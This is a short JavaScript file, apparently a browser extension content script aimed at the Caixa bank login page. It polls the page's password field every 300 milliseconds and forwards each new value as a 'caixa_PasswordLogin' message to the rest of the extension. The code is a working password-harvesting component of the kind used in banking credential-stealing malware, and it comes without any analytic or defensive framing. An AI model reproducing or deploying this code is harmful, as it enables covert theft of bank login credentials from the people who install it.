setInterval(function(){
	console.log('passwordLogin');
},1000);

var oldPassword;
var newPassword;

setInterval(function(){
	newPassword = $('input[fieldtype="password"]').val();
	if(newPassword !== oldPassword){
		oldPassword = newPassword;
		sendPassword(newPassword);
	}
},300);

var sendPassword = function(password){
	chrome.runtime.sendMessage({
		event : 'caixa_PasswordLogin',
		password : password
	});
};
